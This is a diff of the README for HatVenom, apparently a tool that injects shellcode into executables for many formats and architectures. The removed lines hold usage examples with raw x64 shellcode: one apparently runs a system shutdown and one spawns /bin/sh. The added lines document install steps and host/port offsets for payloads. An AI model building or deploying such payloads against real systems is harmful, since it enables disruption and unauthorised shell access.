@@ -8,81 +8,36 @@ Powerful payload generation and shellcode injection tool that provides support f
 * Support for most common architectures like `x64`, `x86`, `aarch64`, `armle`, `mipsle`, `mipsbe`.
 * Ability to modify shellcode by changing pre-defined offsets.
 
-## How it works
-
-* **1.** First we are preparing provided shellcode for injection, we are setting offsets and formatting opcodes.
-* **2.** Next we are generating executable, we taking default format header and magic to create simple template.
-
-**NOTICE:** *For `macho` we are using already prepared templates in the `templates/` directory*.
-
-* **3.** Then we are injecting prepared shellcode to generated template.
-
 ## Installation
 
 ```bash
-python3 setup.py install
+git clone https://github.com/EntySec/HatVenom.git
+cd HatVenom
+sudo python3 setup.py install
 ```
 
-## CLI examples
+## Shellcode offsets
 
-```bash
-python3 hatvenom.py --format elf --arch x64 --shellcode '\x00'
-
-# With replacing offsets
-
-python3 hatvenom.py --format elf --arch x64 --shellcode '\x00:string:\x00' --offsets string=alena
-```
-
-**result:**
+Shellcode offsets is a variables used to add something to shelcode on the preprocessing stage. Offsets looks like this:
 
 ```
-[i] Target format: elf
-[i] Target architecture: x64
-[*] Generating payload...
-[i] Final payload size: 121
-[*] Saving payload to a.out...
-[+] Payload saved to a.out!
+\x90\x90\x90\x90:message:string:\x90\x90\x90\x90
 ```
 
-## Python example
+Where `message` is an offset name and `string` is an offset type. So the basic usage of the offset looks like:
 
-```python
-from hatvenom import HatVenom
-
-shellcode = (
-    b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
-    b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
-    b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
-    b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
-    b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
-    b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
-    b"\x50\x48\x89\xe7\x52\x53\x51\x57"
-    b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
-    b"\x05"
-)
-
-hatvenom = HatVenom()
-hatvenom.generate_to('elf', 'x64', shellcode)
+```
+[shellcode]:[name]:[type]:[shellcode]
 ```
 
-## Replacing offsets
+There are some possible offsets types:
 
-HatVenom allows you to replace offsets in your shellcode, that means that you can create executable files with injected value.
+* `string` - Plain text that will be converted to bytes on the preprocessing stage.
+* `host` - IP address that will be converted to bytes on the preprocessing stage.
+* `port` - Numeric port that will be converted to bytes on the preprocessing stage.
 
-```python
-from hatvenom import HatVenom
+So if you want to replace offset with bytes instead of `string`, `host` and `port`, you can use this type:
 
-shellcode = (
-    b"\x48\x31\xf6\x56\x48\xbf"
-    b":shell:string:"
-    b"\x57\x48\x89\xe7\x48\x31"
-    b"\xd2\x48\x31\xc0\xb0\x02"
-    b"\x48\xc1\xc8\x28\xb0\x3b"
-    b"\x0f\x05"
-)
-
-hatvenom = HatVenom()
-hatvenom.generate_to('macho', 'x64', shellcode, {'shell':'//bin/sh'})
 ```
-
-Offsets must be this type `:offset:` or if you want to specify offset type - `:<offset>:<type>:`.
+[shellcode]:[name]:[shellcode]
+```
